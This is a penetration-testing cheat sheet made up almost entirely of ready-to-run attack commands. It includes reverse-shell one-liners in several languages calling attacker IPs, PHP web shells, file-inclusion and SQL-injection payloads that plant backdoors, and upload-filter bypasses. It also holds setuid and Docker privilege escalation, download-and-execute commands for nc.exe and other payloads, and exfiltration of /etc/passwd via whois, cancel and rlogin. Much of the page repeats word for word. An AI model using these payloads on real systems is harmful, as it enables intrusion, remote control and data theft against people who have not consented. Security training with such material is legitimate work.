COMMANDS TO TRY ⬇️⬇️⬇️
nmap 10.1.1.1 --open -oG scan-results; cat scan-results | grep "/open" | cut -d " " -f 2 > exposed-services-ips
-------------------
Extracting Live IPs from Nmap Scan
nmap 10.1.1.1 --open -oG scan-results; cat scan-results | grep "/open" | cut -d " " -f 2 > exposed-services-ips
Simple Port Knocking
for x in 7000 8000 9000; do nmap -Pn –host_timeout 201 –max-retries 0 -p $x 1.1.1.1; done
DNS lookups, Zone Transfers & Brute-Force
whois domain.com
dig {a|txt|ns|mx} domain.com
dig {a|txt|ns|mx} domain.com @ns1.domain.com
host -t {a|txt|ns|mx} megacorpone.com
host -a megacorpone.com
host -l megacorpone.com ns1.megacorpone.com
dnsrecon -d megacorpone.com -t axfr @ns2.megacorpone.com
dnsenum domain.com
nslookup -> set type=any -> ls -d domain.com
for sub in $(cat subdomains.txt);do host $sub.domain.com|grep "has.address";done
Banner Grabbing
nc -v $TARGET 80
telnet $TARGET 80
curl -vX $TARGET
NFS Exported Shares
List NFS exported shares:
showmount -e 192.168.110.102
...and check if 'rw,no_root_squash' is present. If it is present, compile the below sid-shell.c:
#include <unistd.h>

main( int argc, char ** argv, char ** envp )
{
    setgid(0); setuid(0); system("/bin/bash", argv, envp);
    return 0;
}
...upload it to the share and execute the below to launch sid-shell to spawn a root shell:
chown root:root sid-shell; chmod +s sid-shell; ./sid-shell
Kerberos Enumeration
# users
nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test'
HTTP Brute-Force & Vulnerability Scanning
target=10.0.0.1; gobuster -u http://$target -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 150 -l | tee $target-gobuster
target=10.0.0.1; nikto -h http://$target:80 | tee $target-nikto
target=10.0.0.1; wpscan --url http://$target:80 --enumerate u,t,p | tee $target-wpscan-enum
RPC / NetBios / SMB
rpcinfo -p $TARGET
nbtscan $TARGET

#list shares
smbclient -L //$TARGET -U ""

# null session
rpcclient -U "" $TARGET
smbclient -L //$TARGET
enum4linux $TARGET
SNMP
# Windows User Accounts
snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.25

# Windows Running Programs
snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.4.2.1.2

# Windows Hostname
snmpwalk -c public -v1 $TARGET .1.3.6.1.2.1.1.5

# Windows Share Information
snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.3.1.1

# Windows Share Information
snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.27

# Windows TCP Ports
snmpwalk -c public -v1 $TARGET4 1.3.6.1.2.1.6.13.1.3

# Software Name
snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.6.3.1.2

# brute-force community strings
onesixtyone -i snmp-ips.txt -c community.txt

snmp-check $TARGET
SMTP
smtp-user-enum -U /usr/share/wordlists/names.txt -t $TARGET -m 150
Active Directory
# current domain info
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# domain trusts
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

# current forest info
[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()

# get forest trust relationships
([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', 'forest-of-interest.local')))).GetAllTrustRelationships()

# get DCs of a domain
nltest /dclist:offense.local
net group "domain controllers" /domain

# get DC for currently authenticated session
nltest /dsgetdc:offense.local

# get domain trusts from cmd shell
nltest /domain_trusts

# get user info
nltest /user:"spotless"

# get DC for currently authenticated session
set l

# get domain name and DC the user authenticated to
klist

# get all logon sessions. Includes NTLM authenticated sessions
klist sessions

# kerberos tickets for the session
klist

# cached krbtgt
klist tgt

# whoami on older Windows systems
set u

# find DFS shares with ADModule
Get-ADObject -filter * -SearchBase "CN=Dfs-Configuration,CN=System,DC=offense,DC=local" | select name

# find DFS shares with ADSI
$s=[adsisearcher]'(name=*)'; $s.SearchRoot = [adsi]"LDAP://CN=Dfs-Configuration,CN=System,DC=offense,DC=local"; $s.FindAll() | % {$_.properties.name}

# check if spooler service is running on a host
powershell ls "\\dc01\pipe\spoolss"
Listen on a port (Powershell)
# Start listener on port 443
$listener = [System.Net.Sockets.TcpListener]443; $listener.Start();
 
while($true)
{
    $client = $listener.AcceptTcpClient();
    Write-Host $client.client.RemoteEndPoint "connected!";
    $client.Close();
    start-sleep -seconds 1;
}
Gaining Access
Reverse Shell One-Liners
Bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
Perl
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
URL-Encoded Perl: Linux
echo%20%27use%20Socket%3B%24i%3D%2210.11.0.245%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2fbin%2fsh%20-i%22%29%3B%7D%3B%27%20%3E%20%2ftmp%2fpew%20%26%26%20%2fusr%2fbin%2fperl%20%2ftmp%2fpew
Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
PHP
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
Ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
Netcat without -e #1
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 1234 > /tmp/f
Netcat without -e #2
nc localhost 443 | /bin/sh | nc localhost 444
telnet localhost 443 | /bin/sh | telnet localhost 444
Java
r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor();
XTerm
xterm -display 10.0.0.1:1
JDWP RCE
print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec("whoami").getInputStream())).readLine())
Working with Restricted Shells
# rare cases
ssh bill@localhost ls -l /tmp
nice /bin/bash
Interactive TTY Shells
/usr/bin/expect sh
python -c ‘import pty; pty.spawn(“/bin/sh”)’
# execute one command with su as another user if you do not have access to the shell. Credit to g0blin.co.uk
python -c 'import pty,subprocess,os,time;(master,slave)=pty.openpty();p=subprocess.Popen(["/bin/su","-c","id","bynarr"],stdin=slave,stdout=slave,stderr=slave);os.read(master,1024);os.write(master,"fruity\n");time.sleep(0.1);print os.read(master,1024);'
Uploading/POSTing Files Through WWW Upload Forms
# POST file
curl -X POST -F "file=@/file/location/shell.php" http://$TARGET/upload.php --cookie "cookie"

# POST binary data to web form
curl -F "field=<shell.zip" http://$TARGET/upld.php -F 'k=v' --cookie "k=v;" -F "submit=true" -L -v
PUTing File on the Webhost via PUT verb
curl -X PUT -d '<?php system($_GET["c"]);?>' http://192.168.2.99/shell.php
Generating Payload Pattern & Calculating Offset
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q $EIP_VALUE
Bypassing File Upload Restrictions
file.php -> file.jpg
file.php -> file.php.jpg
file.asp -> file.asp;.jpg
file.gif (contains php code, but starts with string GIF/GIF98)
00%
file.jpg with php backdoor in exif (see below)
.jpg -> proxy intercept -> rename to .php
Injecting PHP into JPEG
exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' backdoor.jpeg
exiftool “-comment<=back.php” back.png
Uploading .htaccess to interpret .blah as .php
AddType application/x-httpd-php .blah
Cracking Passwords
Cracking Web Forms with Hydra
hydra 10.10.10.52 http-post-form -L /usr/share/wordlists/list "/endpoint/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s PORT -P /usr/share/wordlists/list
Cracking Common Protocols with Hydra
hydra 10.10.10.52 -l username -P /usr/share/wordlists/list ftp|ssh|smb://10.0.0.1
HashCat Cracking
# Bruteforce based on the pattern;
hashcat -a3 -m0 mantas?d?d?d?u?u?u --force --potfile-disable --stdout  

# Generate password candidates: wordlist + pattern;
hashcat -a6 -m0 "e99a18c428cb38d5f260853678922e03" yourPassword|/usr/share/wordlists/rockyou.txt ?d?d?d?u?u?u --force --potfile-disable --stdout

# Generate NetNLTMv2 with internalMonologue and crack with hashcat
InternalMonologue.exe -Downgrade False -Restore False -Impersonate True -Verbose False -challange 002233445566778888800
# resulting hash
spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000

# crack with hashcat
hashcat -m5600 'spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000' -a 3 /usr/share/wordlists/rockyou.txt --force --potfile-disable
Generating Payload with msfvenom
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.245 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
Compiling Code From Linux
# Windows
i686-w64-mingw32-gcc source.c -lws2_32 -o out.exe

# Linux
gcc -m32|-m64 -o output source.c
Compiling Assembly from Windows
# https://www.nasm.us/pub/nasm/releasebuilds/?C=M;O=D
nasm -f win64 .\hello.asm -o .\hello.obj

# http://www.godevtool.com/Golink.zip
GoLink.exe -o .\hello.exe .\hello.obj
Local File Inclusion to Shell
nc 192.168.1.102 80
GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
Host: 192.168.1.102
Connection: close

# Then send as cmd payload via http://192.168.1.102/index.php?page=../../../../../var/log/apache2/access.log&cmd=id
Local File Inclusion: Reading Files
file:///etc/passwd

http://example.com/index.php?page=php://input&cmd=ls
    POST: <?php system($_GET['cmd']); ?>
http://192.168.2.237/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input
    POST: <?php system('uname -a');die(); ?>

expect://whoami
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=&cmd=id
http://10.1.1.1/index.php?page=data://text/plain,%3C?php%20system%28%22uname%20-a%22%29;%20?%3E

# ZIP Wrapper
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;  
zip payload.zip payload.php;   
mv payload.zip shell.jpg;    
http://example.com/index.php?page=zip://shell.jpg%23payload.php

# Loop through file descriptors
curl '' -H 'Cookie: PHPSESSID=df74dce800c96bcac1f59d3b3d42087d' --output -
Remote File Inclusion Shell: Windows + PHP
<?php system("powershell -Command \"& {(New-Object System.Net.WebClient).DownloadFile('http://10.11.0.245/netcat/nc.exe','nc.exe'); cmd /c nc.exe 10.11.0.245 4444 -e cmd.exe\" }"); ?>
SQL Injection to Shell or Backdoor
# Assumed 3 columns
http://target/index.php?vulnParam=0' UNION ALL SELECT 1,"<?php system($_REQUEST['cmd']);?>",2,3 INTO OUTFILE "c:/evil.php"-- uMj
# sqlmap; post-request - captured request via Burp Proxy via Save Item to File.
sqlmap -r post-request -p item --level=5 --risk=3 --dbms=mysql --os-shell --threads 10
# netcat reverse shell via mssql injection when xp_cmdshell is available
1000';+exec+master.dbo.xp_cmdshell+'(echo+open+10.11.0.245%26echo+anonymous%26echo+whatever%26echo+binary%26echo+get+nc.exe%26echo+bye)+>+c:\ftp.txt+%26+ftp+-s:c:\ftp.txt+%26+nc.exe+10.11.0.245+443+-e+cmd';--
SQLite Injection to Shell or Backdoor
ATTACH DATABASE '/home/www/public_html/uploads/phpinfo.php' as pwn; 
CREATE TABLE pwn.shell (code TEXT); 
INSERT INTO pwn.shell (code) VALUES ('<?php system($_REQUEST['cmd']);?>');
MS-SQL Console
mssqlclient.py -port 27900 user:password@10.1.1.1
sqsh -S 10.1.1.1 -U user -P password
Upgradig Non-Interactive Shell
python -c 'import pty; pty.spawn("/bin/sh")'
/bin/busybox sh
Python Input Code Injection
__import__('os').system('id')
Local Enumeration & Privilege Escalation

Check AppLocker Policies
Get-AppLockerPolicy -Local).RuleCollections

Get-ChildItem -Path HKLM:Software\Policies\Microsoft\Windows\SrpV2 -Recurse
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\

Applocker: Writable Windows Directories
# list from https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md
C:\Windows\Tasks
C:\Windows\Temp
C:\windows\tracing
C:\Windows\Registration\CRMLog
C:\Windows\System32\FxsTmp
C:\Windows\System32\com\dmp
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\PRINTERS
C:\Windows\System32\spool\SERVERS
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\System32\Tasks_Migrated (after peforming a version upgrade of Windows 10)
C:\Windows\SysWOW64\FxsTmp
C:\Windows\SysWOW64\com\dmp
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
Find Writable Files/Folders in Windows
$a = Get-ChildItem "c:\windows\" -recurse -ErrorAction SilentlyContinue
$a | % {
    $fileName = $_.fullname
    $acls = get-acl $fileName  -ErrorAction SilentlyContinue | select -exp access | ? {$_.filesystemrights -match "full|modify|write" -and $_.identityreference -match "authenticated users|everyone|$env:username"}
    if($acls -ne $null)
    {
        [pscustomobject]@{
            filename = $fileName
            user = $acls | select -exp identityreference
        }
    }
}
Check if Powershell Logging is Enabled
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
Check WinEvent Logs for SecureString Exposure
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} | Select-Object -Property Message | Select-String -Pattern 'SecureString'
Check WinEvent for Machine Wake/Sleep times
Get-WinEvent -FilterHashTable @{ ProviderName = 'Microsoft-Windows-Power-TroubleShooter'  ; Id = 1 }|Select-Object -Property @{n='Sleep';e={$_.Properties[0].Value}},@{n='Wake';e={$_.Properties[1].Value}}
Audit Policies
auditpol /get /category:*
Check if LSASS is running in PPL
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
Binary Exploitation with ImmunityDebugger
Get Loaded Modules
# We're interested in modules without protection, Read & Execute permissions
!mona modules

Finding JMP ESP Address
!mona find -s "\xFF\xE4" -m moduleName

Cracking a ZIP Password
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt bank-account.zip

Setting up Simple HTTP server

#Linux
python -m SimpleHTTPServer 80
python3 -m http.server
ruby -r webrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"
php -S 0.0.0.0:80
MySQL User Defined Fuction Privilge Escalation
Requires raptor_udf2.c and sid-shell.c or full raptor.tar:


gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
use mysql;
create table npn(line blob);
insert into npn values(load_file('/tmp/raptor_udf2.so'));
select * from npn into dumpfile '/usr/lib/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select do_system('chown root:root /tmp/sid-shell; chmod +s /tmp/sid-shell');

Docker Privilege Esclation
echo -e "FROM ubuntu:14.04\nENV WORKDIR /stuff\nRUN mkdir -p /stuff\nVOLUME [ /stuff ]\nWORKDIR /stuff" > Dockerfile && docker build -t my-docker-image . && docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c 'cp /bin/sh /stuff && chown root.root /stuff/sh && chmod a+s /stuff/sh' && ./sh -c id && ./sh

Resetting root Password
echo "root:spotless" | chpasswd
Uploading Files to Target Machine
TFTP
#TFTP Linux: cat /etc/default/atftpd to find out file serving location; default in kali /srv/tftp
service atftpd start

# Windows
tftp -i $ATTACKER get /download/location/file /save/location/file
FTP
# Linux: set up ftp server with anonymous logon access;
twistd -n ftp -p 21 -r /file/to/serve

# Windows shell: read FTP commands from ftp-commands.txt non-interactively;
echo open $ATTACKER>ftp-commands.txt
echo anonymous>>ftp-commands.txt
echo whatever>>ftp-commands.txt
echo binary>>ftp-commands.txt
echo get file.exe>>ftp-commands.txt
echo bye>>ftp-commands.txt 
ftp -s:ftp-commands.txt

# Or just a one-liner
(echo open 10.11.0.245&echo anonymous&echo whatever&echo binary&echo get nc.exe&echo bye) > ftp.txt & ftp -s:ftp.txt & nc.exe 10.11.0.245 443 -e cmd
CertUtil
certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
PHP
<?php file_put_contents("/var/tmp/shell.php", file_get_contents("http://10.11.0.245/shell.php")); ?>
Python
python -c "from urllib import urlretrieve; urlretrieve('http://10.11.0.245/nc.exe', 'C:\\Temp\\nc.exe')"
HTTP: Powershell
powershell -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/nc.exe','nc.exe'); cmd /c nc.exe $ATTACKER 4444 -e cmd.exe" }
powershell -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/nc.exe','nc.exe'); Start-Process nc.exe -NoNewWindow -Argumentlist '$ATTACKER 4444 -e cmd.exe'" }
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/nc.exe','nc.exe')"; Start-Process nc.exe -NoNewWindow -Argumentlist '$ATTACKER 4444 -e cmd.exe'"
powershell (New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/file.exe','file.exe');(New-Object -com Shell.Application).ShellExecute('file.exe');

# download using default proxy credentials and launch
powershell -command { $b=New-Object System.Net.WebClient; $b.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; $b.DownloadString("http://$attacker/nc.exe") | Out-File nc.exe; Start-Process nc.exe -NoNewWindow -Argumentlist '$ATTACKER 4444 -e cmd.exe'" }

HTTP: VBScript
Copy and paste contents of wget.vbs into a Windows Shell and then:
cscript wget.vbs http://$ATTACKER/file.exe localfile.exe

HTTP: Linux
wget http://$ATTACKER/file

curl http://$ATTACKER/file -O

scp ~/file/file.bin user@$TARGET:tmp/backdoor.py


NetCat
# Attacker
nc -l -p 4444 < /tool/file.exe

# Victim
nc $ATTACKER 4444 > file.exe
HTTP: Windows "debug.exe" Method
# 1. In Linux, convert binary to hex ascii:
wine /usr/share/windows-binaries/exe2bat.exe /root/tools/netcat/nc.exe nc.txt
# 2. Paste nc.txt into Windows Shell.
HTTP: Windows BitsAdmin
cmd.exe /c "bitsadmin /transfer myjob /download /priority high http://$ATTACKER/payload.exe %tmp%\payload.exe&start %tmp%\payload.exe

Wscript Script Code Download & Execution
echo GetObject("script:https://bad.com/code.js") > code.js && wscript.exe code.js
<?xml version="1.0"?>
<package>
<component id="PopCalc">
<script language="JScript">
    <![CDATA[
    var r = new ActiveXObject("WScript.Shell").Run("calc"); 
    ]]>
</script>
</component>
</package>

Whois Data Exfiltration
# attacker
nc -l -v -p 43 | sed "s/ //g" | base64 -d
# victim
whois -h $attackerIP -p 43 `cat /etc/passwd | base64`
Cancel Data Exfiltration
cancel -u "$(cat /etc/passwd)" -h ip:port
rlogin Data Exfiltration
rlogin -l "$(cat /etc/passwd)" -p port host
Bash Ping Sweeper
#!/bin/bash
for lastOctet in {1..254}; do 
    ping -c 1 10.0.0.$lastOctet | grep "bytes from" | cut -d " " -f 4 | cut -d ":" -f 1 &
done

Brute-forcing XOR'ed string with 1 byte key in Python
encrypted = "encrypted-string-here"
for i in range(0,255):
    print("".join([chr(ord(e) ^ i) for e in encrypted]))

Generating Bad Character Strings
# Python
'\\'.join([ "x{:02x}".format(i) for i in range(1,256) ])
# Bash
for i in {1..255}; do printf "\\\x%02x" $i; done; echo -e "\r"
Converting Python to Windows Executable (.py -> .exe)
python pyinstaller.py --onefile convert-to-exe.py
Port Scanning with NetCat
nc -nvv -w 1 -z host 1000-2000
nc -nv -u -z -w 1 host 160-162

Port Scanning with Masscan
masscan -p1-65535,U:1-65535 10.10.10.x --rate=1000 -e tun0

Exploiting Vulnerable Windows Services: Weak Service Permissions

Extracting Live IPs from Nmap Scan
nmap 10.1.1.1 --open -oG scan-results; cat scan-results | grep "/open" | cut -d " " -f 2 > exposed-services-ips

Simple Port Knocking
for x in 7000 8000 9000; do nmap -Pn –host_timeout 201 –max-retries 0 -p $x 1.1.1.1; done

DNS lookups, Zone Transfers & Brute-Force
whois domain.com
dig {a|txt|ns|mx} domain.com
dig {a|txt|ns|mx} domain.com @ns1.domain.com
host -t {a|txt|ns|mx} megacorpone.com
host -a megacorpone.com
host -l megacorpone.com ns1.megacorpone.com
dnsrecon -d megacorpone.com -t axfr @ns2.megacorpone.com
dnsenum domain.com
nslookup -> set type=any -> ls -d domain.com
for sub in $(cat subdomains.txt);do host $sub.domain.com|grep "has.address";done

Banner Grabbing
nc -v $TARGET 80
telnet $TARGET 80
curl -vX $TARGET
NFS Exported Shares
List NFS exported shares:
showmount -e 192.168.110.102
...and check if 'rw,no_root_squash' is present. If it is present, compile the below sid-shell.c:
#include <unistd.h>

main( int argc, char ** argv, char ** envp )
{
    setgid(0); setuid(0); system("/bin/bash", argv, envp);
    return 0;
}
...upload it to the share and execute the below to launch sid-shell to spawn a root shell:
chown root:root sid-shell; chmod +s sid-shell; ./sid-shell
Kerberos Enumeration
# users
nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test'
HTTP Brute-Force & Vulnerability Scanning
target=10.0.0.1; gobuster -u http://$target -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 150 -l | tee $target-gobuster
target=10.0.0.1; nikto -h http://$target:80 | tee $target-nikto
target=10.0.0.1; wpscan --url http://$target:80 --enumerate u,t,p | tee $target-wpscan-enum
RPC / NetBios / SMB
rpcinfo -p $TARGET
nbtscan $TARGET

#list shares
smbclient -L //$TARGET -U ""

# null session
rpcclient -U "" $TARGET
smbclient -L //$TARGET
enum4linux $TARGET
SNMP
# Windows User Accounts
snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.25

# Windows Running Programs
snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.4.2.1.2

# Windows Hostname
snmpwalk -c public -v1 $TARGET .1.3.6.1.2.1.1.5

# Windows Share Information
snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.3.1.1

# Windows Share Information
snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.27

# Windows TCP Ports
snmpwalk -c public -v1 $TARGET4 1.3.6.1.2.1.6.13.1.3

# Software Name
snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.6.3.1.2

# brute-force community strings
onesixtyone -i snmp-ips.txt -c community.txt

snmp-check $TARGET
SMTP
smtp-user-enum -U /usr/share/wordlists/names.txt -t $TARGET -m 150
Active Directory
# current domain info
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# domain trusts
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

# current forest info
[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()

# get forest trust relationships
([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', 'forest-of-interest.local')))).GetAllTrustRelationships()

# get DCs of a domain
nltest /dclist:offense.local
net group "domain controllers" /domain

# get DC for currently authenticated session
nltest /dsgetdc:offense.local

# get domain trusts from cmd shell
nltest /domain_trusts

# get user info
nltest /user:"spotless"

# get DC for currently authenticated session
set l

# get domain name and DC the user authenticated to
klist

# get all logon sessions. Includes NTLM authenticated sessions
klist sessions

# kerberos tickets for the session
klist

# cached krbtgt
klist tgt

# whoami on older Windows systems
set u

# find DFS shares with ADModule
Get-ADObject -filter * -SearchBase "CN=Dfs-Configuration,CN=System,DC=offense,DC=local" | select name

# find DFS shares with ADSI
$s=[adsisearcher]'(name=*)'; $s.SearchRoot = [adsi]"LDAP://CN=Dfs-Configuration,CN=System,DC=offense,DC=local"; $s.FindAll() | % {$_.properties.name}

# check if spooler service is running on a host
powershell ls "\\dc01\pipe\spoolss"

Listen on a port (Powershell)
# Start listener on port 443
$listener = [System.Net.Sockets.TcpListener]443; $listener.Start();
 
while($true)
{
    $client = $listener.AcceptTcpClient();
    Write-Host $client.client.RemoteEndPoint "connected!";
    $client.Close();
    start-sleep -seconds 1;
}
Gaining Access
Reverse Shell One-Liners
Bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

Perl
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

URL-Encoded Perl: Linux
echo%20%27use%20Socket%3B%24i%3D%2210.11.0.245%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2fbin%2fsh%20-i%22%29%3B%7D%3B%27%20%3E%20%2ftmp%2fpew%20%26%26%20%2fusr%2fbin%2fperl%20%2ftmp%2fpew

Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

PHP
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

Ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

Netcat without -e #1
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 1234 > /tmp/f

Netcat without -e #2
nc localhost 443 | /bin/sh | nc localhost 444
telnet localhost 443 | /bin/sh | telnet localhost 444

Java
r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor();

XTerm
xterm -display 10.0.0.1:1

JDWP RCE
print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec("whoami").getInputStream())).readLine())

Working with Restricted Shells
# rare cases
ssh bill@localhost ls -l /tmp
nice /bin/bash

Interactive TTY Shells
/usr/bin/expect sh
python -c ‘import pty; pty.spawn(“/bin/sh”)’
# execute one command with su as another user if you do not have access to the shell. Credit to g0blin.co.uk
python -c 'import pty,subprocess,os,time;(master,slave)=pty.openpty();p=subprocess.Popen(["/bin/su","-c","id","bynarr"],stdin=slave,stdout=slave,stderr=slave);os.read(master,1024);os.write(master,"fruity\n");time.sleep(0.1);print os.read(master,1024);'

Uploading/POSTing Files Through WWW Upload Forms
# POST file
curl -X POST -F "file=@/file/location/shell.php" http://$TARGET/upload.php --cookie "cookie"

# POST binary data to web form
curl -F "field=<shell.zip" http://$TARGET/upld.php -F 'k=v' --cookie "k=v;" -F "submit=true" -L -v
PUTing File on the Webhost via PUT verb
curl -X PUT -d '<?php system($_GET["c"]);?>' http://192.168.2.99/shell.php

Generating Payload Pattern & Calculating Offset
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q $EIP_VALUE

Bypassing File Upload Restrictions
file.php -> file.jpg
file.php -> file.php.jpg
file.asp -> file.asp;.jpg
file.gif (contains php code, but starts with string GIF/GIF98)
00%
file.jpg with php backdoor in exif (see below)
.jpg -> proxy intercept -> rename to .php

Injecting PHP into JPEG
exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' backdoor.jpeg
exiftool “-comment<=back.php” back.png

Uploading .htaccess to interpret .blah as .php
AddType application/x-httpd-php .blah
Cracking Passwords
Cracking Web Forms with Hydra
hydra 10.10.10.52 http-post-form -L /usr/share/wordlists/list "/endpoint/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s PORT -P /usr/share/wordlists/list
